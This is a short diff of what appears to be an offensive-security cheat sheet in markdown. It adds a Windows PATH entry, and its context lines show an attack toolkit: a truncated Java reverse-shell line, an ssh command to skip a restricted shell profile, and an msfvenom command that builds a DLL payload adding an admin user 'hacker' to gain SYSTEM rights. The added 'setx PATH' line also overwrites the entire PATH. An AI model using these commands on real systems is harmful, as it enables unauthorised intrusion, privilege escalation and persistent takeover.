@@ -393,6 +393,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. ```bash ssh alfred@server_name -t "bash --noprofile"``` 
 
 #### Windws Tricks
+	
+##### Setting PATH on Windows
+> 1. ```setx PATH "C:\windows\system32"```
 ##### Windows add user 'hacker' with 'admin' privs and become 'nt authority\system' 
 > 1. msfvenom -p windows/adduser USER='hacker' PASS='Hacker123$' -f dll > version.dll
 or
